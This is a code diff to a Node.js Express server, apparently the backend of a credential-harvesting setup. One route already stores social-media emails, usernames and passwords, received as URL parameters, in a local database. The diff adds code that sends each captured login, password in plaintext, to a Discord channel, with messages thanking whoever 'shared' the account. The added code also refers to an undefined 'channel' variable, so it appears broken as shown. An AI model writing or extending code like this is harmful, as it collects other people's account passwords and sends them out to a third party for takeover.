@@ -4,9 +4,12 @@ import fs from 'fs';
 import path from 'path';
 import sqlite3 from 'sqlite3';
 import execPhp from 'exec-php';
+import { client, guild } from './discordBot/main.mjs';
+import { EmbedBuilder } from 'discord.js';
 
 const app = express();
 const server = http.createServer(app);
+
 
 const database = new sqlite3.Database("passwords.db", sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
     if (err && err.code == "SQLITE_CANTOPEN") {
@@ -54,6 +57,24 @@ app.get('/addSocial/:social/:email/:username/:password', (req, res) => {
             return;
         } else console.log("Data inserted.");
     });
+
+    const accountEmbed = new EmbedBuilder()
+	.setColor(0x0099FF)
+	.setTitle('A new account is shared')
+	.setDescription('Someone decided to share this account :3')
+	// .setThumbnail('https://i.imgur.com/AfFp7pu.png')
+	.addFields(
+		{ name: 'Social : ', value: req.params.social },
+		{ name: '\u200B', value: '\u200B' },
+		{ name: 'Username : ', value: req.params.username, inline: true },
+		{ name: 'Email : ', value: req.params.email, inline: true },
+        { name: 'Password : ', value: req.params.password, inline: true}
+	)
+	// .setImage('https://i.imgur.com/AfFp7pu.png')
+	.setTimestamp()
+	.setFooter({ text: 'Thank you cutie ❤' });
+
+    channel.send({ embeds: [accountEmbed] });
     res.send("Data inserted.");
 });
 
